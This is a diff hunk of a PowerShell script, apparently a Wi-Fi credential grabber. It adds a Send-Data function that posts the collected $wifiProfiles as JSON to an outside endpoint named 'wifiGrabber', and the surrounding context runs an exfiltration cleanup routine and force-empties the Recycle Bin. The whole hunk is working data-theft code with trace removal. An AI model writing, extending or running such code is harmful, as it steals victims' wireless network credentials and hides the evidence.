@@ -79,7 +79,24 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 ############################################################################################################################################################
+function Send-Data {
+  param (
+    [Parameter(Mandatory = $true)]
+    [string]$Data
+  )
 
+  $uri = "https://erxt.dev/wifiGrabber"
+  $headers = @{
+    "Content-Type" = "application/json"
+  }
+  $body = @{
+    "data" = $Data
+  } | ConvertTo-Json
+
+  Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body
+}
+
+Send-Data -Data $wifiProfiles
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
